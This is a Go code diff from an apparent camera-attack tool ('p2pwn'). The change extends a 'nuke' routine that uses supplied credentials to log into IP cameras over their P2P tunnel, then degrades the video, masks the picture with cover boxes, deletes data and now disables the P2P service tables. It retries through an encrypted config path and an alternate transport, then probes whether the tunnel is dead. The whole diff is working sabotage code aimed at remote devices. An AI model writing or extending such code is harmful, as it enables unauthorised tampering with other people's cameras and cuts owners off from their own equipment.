@@ -5,13 +5,16 @@ package core
 import (
 	"fmt"
 	"strings"
+	"time"
 
 	"github.com/thebadinteger/p2pwn/core/p2p"
 )
 
 type nukeSession struct {
+	via    string
 	get    func(name string) ([]any, error)
 	set    func(name string, table any) error
+	setSec func(name string, table any) error
 	call   func(method string, params map[string]any) (map[string]any, error)
 	closer func()
 }
@@ -28,11 +31,11 @@ func (n NukeConfig) videoLevel() int {
 }
 
 func (n NukeConfig) enabled() bool {
-	return n.Delete || n.Box || n.videoLevel() > 0
+	return n.Delete || n.Box || n.Disable || n.videoLevel() > 0
 }
 
 func newNukeSession(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, error) {
-	dhipErr := error(nil)
+	var dhipErr error
 	if s, err := newNukeDHIP(tunnel, login, pass); err == nil {
 		return s, nil
 	} else {
@@ -56,6 +59,7 @@ func newNukeDHIP(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, erro
 	}
 	id := 100
 	return &nukeSession{
+		via: "dhip",
 		get: func(name string) ([]any, error) {
 			return dhipGetTable(dhip, name, id)
 		},
@@ -76,11 +80,16 @@ func newNukeRPC2(tunnel *p2p.PTCPTunnel, login, pass string) (*nukeSession, erro
 	}
 	id := 100
 	return &nukeSession{
+		via: "rpc",
 		get: func(name string) ([]any, error) {
 			return rpc2GetTable(osd.conn, osd.sess, osd.cookie, name, id)
 		},
 		set: func(name string, table any) error {
 			return rpc2SetConfig(osd.conn, osd.sess, osd.cookie, name, table, id)
+		},
+		setSec: func(name string, table any) error {
+			_, err := securitySetConfig(osd.conn, osd.sess, osd.cookie, name, table)
+			return err
 		},
 		call: func(method string, params map[string]any) (map[string]any, error) {
 			out, _, err := osd.conn.post("/RPC2", map[string]any{
@@ -220,11 +229,7 @@ func nukeVideoSet(s *nukeSession, channels, level int) error {
 	return s.set("VideoInSharpness", nukeChannelTable(channels, mkSharp))
 }
 
-func nukeCovers() []any {
-	rects := [][4]int{
-		{3383, 2047, 4649, 6145},
-		{2620, 6145, 5362, 7411},
-	}
+func nukeCovers(rects [][4]int) []any {
 	covers := make([]any, 0, len(rects))
 	for _, r := range rects {
 		covers = append(covers, map[string]any{
@@ -238,12 +243,12 @@ func nukeCovers() []any {
 	return covers
 }
 
-func nukeBox(s *nukeSession, channels int) error {
+func nukeBox(s *nukeSession, channels int, rects [][4]int) error {
 	table, err := s.get("VideoWidget")
 	if err != nil {
 		return err
 	}
-	covers := nukeCovers()
+	covers := nukeCovers(rects)
 	patched := 0
 	apply := func(raw any) {
 		m, ok := raw.(map[string]any)
@@ -268,8 +273,183 @@ func nukeBox(s *nukeSession, channels int) error {
 	return s.set("VideoWidget", table)
 }
 
+func flipP2PFields(raw any, fields []string) int {
+	patched := 0
+	flip := func(item any) {
+		m, ok := item.(map[string]any)
+		if !ok {
+			return
+		}
+		for _, f := range fields {
+			if _, has := m[f]; has {
+				m[f] = false
+				patched++
+			}
+		}
+	}
+	if nested, ok := raw.([]any); ok {
+		for _, item := range nested {
+			flip(item)
+		}
+		return patched
+	}
+	flip(raw)
+	return patched
+}
+
+func checkP2POff(raw any, fields []string) bool {
+	items := []any{raw}
+	if nested, ok := raw.([]any); ok {
+		items = nested
+	}
+	for _, item := range items {
+		m, ok := item.(map[string]any)
+		if !ok {
+			continue
+		}
+		for _, f := range fields {
+			if v, has := m[f]; has && v != false {
+				return false
+			}
+		}
+	}
+	return true
+}
+
+type p2pTableSpec struct {
+	name   string
+	fields []string
+}
+
+func shortErr(err error, n int) string {
+	if err == nil {
+		return ""
+	}
+	s := err.Error()
+	s = strings.ReplaceAll(s, "\n", " ")
+	s = strings.ReplaceAll(s, "\r", " ")
+	if len(s) > n {
+		return s[:n]
+	}
+	return s
+}
+
+func disableTable(ss *nukeSession, spec p2pTableSpec) (ok, retry bool, note string) {
+	table, err := ss.get(spec.name)
+	if err != nil {
+		return false, false, spec.name + " unreadable"
+	}
+	patched := 0
+	for _, raw := range table {
+		patched += flipP2PFields(raw, spec.fields)
+	}
+	if patched == 0 {
+		return false, false, spec.name + " has no switch fields"
+	}
+	if err := ss.set(spec.name, table); err != nil {
+		if ss.setSec != nil {
+			if serr := ss.setSec(spec.name, table); serr == nil {
+				if ok, retry, note := verifyTable(ss, spec); ok {
+					return true, retry, note + " encrypted"
+				} else {
+					return false, retry, note
+				}
+			} else {
+				return false, true, spec.name + " rejected plain (" + shortErr(err, 80) + ") and encrypted (" + shortErr(serr, 80) + ")"
+			}
+		}
+		return false, true, spec.name + " rejected (" + shortErr(err, 80) + ")"
+	}
+	return verifyTable(ss, spec)
+}
+
+func verifyTable(ss *nukeSession, spec p2pTableSpec) (bool, bool, string) {
+	check, err := ss.get(spec.name)
+	if err != nil {
+		if check, err = ss.get(spec.name); err != nil {
+			return false, true, spec.name + " verify unreadable"
+		}
+	}
+	for _, raw := range check {
+		if !checkP2POff(raw, spec.fields) {
+			return false, false, spec.name + " refused"
+		}
+	}
+	return true, false, spec.name + " off via " + ss.via
+}
+
+func nukeDisableP2P(tunnel *p2p.PTCPTunnel, login, pass, serial string) (string, error) {
+	s, err := newNukeSession(tunnel, login, pass)
+	if err != nil {
+		return "", err
+	}
+	defer s.closer()
+	tables := []p2pTableSpec{
+		{"VSP_PaaS", []string{"Enable", "Online"}},
+		{"T2UServer", []string{"Enable"}},
+	}
+	var tried []string
+	note := ""
+	for _, spec := range tables {
+		if ok, retry, n := disableTable(s, spec); ok {
+			note = n
+			break
+		} else {
+			tried = append(tried, n)
+			if !retry {
+				continue
+			}
+		}
+		var alt *nukeSession
+		var aerr error
+		if s.via == "rpc" {
+			alt, aerr = newNukeDHIP(tunnel, login, pass)
+		} else {
+			alt, aerr = newNukeRPC2(tunnel, login, pass)
+		}
+		if aerr != nil {
+			tried = append(tried, "alt transport unavailable ("+shortErr(aerr, 80)+")")
+			continue
+		}
+		if ok, _, n := disableTable(alt, spec); ok {
+			alt.closer()
+			note = n + " via alt"
+			break
+		} else {
+			tried = append(tried, n+" (alt)")
+		}
+		alt.closer()
+	}
+	if note == "" {
+		return "", fmt.Errorf("no p2p switch table (%s)", strings.Join(tried, ", "))
+	}
+	time.Sleep(5 * time.Second)
+	if probeP2PAlive(serial) {
+		return "", fmt.Errorf("%s but P2P tunnel still alive (reboot needed)", note)
+	}
+	return note + ", tunnel dead", nil
+}
+
+func probeP2PAlive(serial string) bool {
+	for i := 0; i < 2; i++ {
+		c := p2p.NewDHClient(serial)
+		c.SetRetries(1)
+		c.SetTimeout(10 * time.Second)
+		err := c.Handshake()
+		c.Close()
+		if err == nil {
+			return true
+		}
+	}
+	return false
+}
+
 func runNuke(tunnel *p2p.PTCPTunnel, login, pass string, channels int, cfg NukeConfig, dummy string, serial string, armed bool) {
 	if !armed || !cfg.enabled() {
+		return
+	}
+	if until := p2p.DeviceLockedUntil(serial); !until.IsZero() {
+		LogNukeResult(serial, "locked", false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
 		return
 	}
 	s, err := newNukeSession(tunnel, login, pass)
@@ -295,10 +475,18 @@ func runNuke(tunnel *p2p.PTCPTunnel, login, pass string, channels int, cfg NukeC
 		}
 	}
 	if cfg.Box {
-		if err := nukeBox(s, channels); err != nil {
+		if err := nukeBox(s, channels, cfg.BoxRects); err != nil {
 			LogNukeResult(serial, "box", false, err)
 		} else {
 			LogNukeResult(serial, "box applied", true, nil)
+		}
+	}
+	// p2p off goes last once everything else is done with the camera
+	if cfg.Disable {
+		if note, err := nukeDisableP2P(tunnel, login, pass, serial); err != nil {
+			LogNukeResult(serial, "disable", false, err)
+		} else {
+			LogNukeResult(serial, "disable "+note, true, nil)
 		}
 	}
 }
